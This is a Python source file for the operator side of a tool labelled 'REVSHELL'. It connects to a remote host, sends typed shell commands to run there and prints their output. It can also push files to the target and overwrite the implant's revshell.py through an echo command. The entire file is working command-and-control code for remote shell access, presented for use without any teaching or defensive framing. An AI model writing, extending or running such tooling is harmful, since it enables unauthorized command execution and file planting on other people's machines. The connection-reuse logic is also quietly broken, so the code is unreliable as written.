import asyncio
from argparse import ArgumentParser


async def connection_factory(ip_address: str, port: int):
    counter = 0
    reader, writer = None, None
    async def get_connection(counter=counter, reader=reader, writer=writer) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        counter += 1
        if counter % 100 != 0 and reader is not None and writer is not None:
            return reader, writer
        reader, writer = await asyncio.open_connection(ip_address, port)
        return reader, writer
    return get_connection


async def client(ip_address: str, port: int) -> None:
    """
    Parameters
    ----------

    ip_address: str
        The ip_address you want to reach
    port: int
        The port to connect to

    Return
    ------

    done: bool
        Whether we are done or not
    """
    # open connection with host
    get_connection = await connection_factory(ip_address, port)
    while True:
        reader, writer = await get_connection()
        # send message to the host 
        message = input(">> ")
        match message.split():
            case ["exit"] | ["q"] | ["quit"]:
                # exit the client machine
                break
            case ["revshell-update"]:
                # update the reverse shell on client's machine
                with open("revshell.py", "r", encoding="utf-8") as new_shell:
                    source = new_shell.read()
                msg = "echo '" + source + "' > revshell.py"
            case ['upload', path]:
                with open(path, 'rb') as upload_file:
                    while True:
                        content = upload_file.read(2048)
                        if not content:
                            break
                        writer.write(content)
                msg = ''
            case _:
                # send the client whichever command we typed
                msg = message
        if msg:
            writer.write(msg.encode("utf-8"))
            await writer.drain()
            # receive result from host
            data = await reader.read()
            print(data.decode("utf-8", errors='ignore'))

        # close connection
        writer.close()
        await writer.wait_closed()


if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("--addr", type=str, default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8888)
    args = parser.parse_args()
    print(f"""
        || ======== ||
        || REVSHELL ||
        || ======== ||
        Attempting to connect to: {args.addr}:{args.port}
    """)
    asyncio.run(client(ip_address=args.addr, port=args.port))
